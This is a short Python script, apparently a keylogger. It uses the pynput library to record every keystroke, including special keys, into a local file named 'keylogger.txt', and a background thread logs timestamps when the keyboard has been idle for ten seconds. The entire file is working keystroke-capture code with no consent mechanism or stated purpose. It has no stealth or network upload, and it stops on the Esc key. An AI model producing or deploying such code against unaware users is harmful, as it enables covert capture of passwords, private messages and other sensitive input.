from pynput import keyboard
import time
import threading

record_time = 10
last_active = time.time()


def reset_idle_timer():
    global last_active
    last_active = time.time()


def on_press(key):
    reset_idle_timer()
    try:
        if key == keyboard.Key.space:
            with open("keylogger.txt", "a") as file:
                file.write(" ")
        else:
            value = '{0}'.format(key.char)
            with open("keylogger.txt", "a") as file:
                file.write(value)
    except AttributeError:
        if key != keyboard.Key.shift:
            with open("keylogger.txt", "a") as file:
                file.write('{0}'.format(key))
            if key != keyboard.Key.enter:
                with open("keylogger.txt", "a") as file:
                    file.write("\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False


def monitor_idle_time():
    while True:
        current_time = time.time()
        idle_time = current_time - last_active
        if idle_time >= record_time:
            with open("keylogger.txt", "a") as file:
                file.write(f'\nSystem idle for {record_time} seconds. Time: {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}\n')
            reset_idle_timer()
        time.sleep(1)


keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
keyboard_listener.start()

idle_monitor_thread = threading.Thread(target=monitor_idle_time)
idle_monitor_thread.daemon = True
idle_monitor_thread.start()

keyboard_listener.join()
